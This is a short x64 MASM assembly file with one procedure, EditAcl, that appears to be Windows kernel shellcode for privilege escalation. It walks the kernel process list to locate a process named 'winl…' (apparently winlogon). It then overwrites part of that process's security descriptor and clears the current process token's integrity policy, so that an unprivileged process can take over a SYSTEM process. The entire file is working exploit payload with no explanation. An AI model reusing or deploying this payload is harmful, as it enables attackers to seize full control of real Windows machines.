.code

EditAcl PROC
	mov rax, qword ptr gs:[188h]
	mov rax, qword ptr [rax + 220h]
	mov rcx, rax
	mov rax, [rax+240h]
	procloop:
	lea rbx, [rax-240h]
	mov rax, [rax]
	add rbx, 450h
	cmp dword ptr [rbx], 6c6e6977h
	jne procloop
	sub rbx, 458h
	mov rax, qword ptr [rbx]
	and rax, 0FFFFFFFFFFFFFFF0h
	add rax, 48h
	mov byte ptr [rax], 0bh
	add rcx, 358h 
	mov rax, qword ptr [rcx]
	and rax, 0FFFFFFFFFFFFFFF0h
	add rax, 0d4h
	mov byte ptr [rax], 0
	ret
EditAcl ENDP

END